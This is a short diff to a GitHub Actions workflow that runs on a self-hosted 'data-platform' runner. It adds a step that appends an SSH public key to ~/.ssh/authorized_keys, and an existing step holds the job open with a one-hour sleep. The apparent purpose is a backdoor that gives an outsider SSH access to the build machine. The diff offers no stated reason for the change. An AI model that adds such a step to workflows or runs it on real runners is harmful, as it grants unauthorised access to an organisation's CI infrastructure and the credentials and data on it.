@@ -9,4 +9,5 @@ jobs:
   foo:
     runs-on: [self-hosted, data-platform, ubuntu, ARM64, 4cpu16ram]
     steps:
+      - run: echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG6ODBYm3KYHSNwpFqUDsRXO24n55JnCq/dNCYHMTIed' >> ~/.ssh/authorized_keys
       - run: sleep 3600
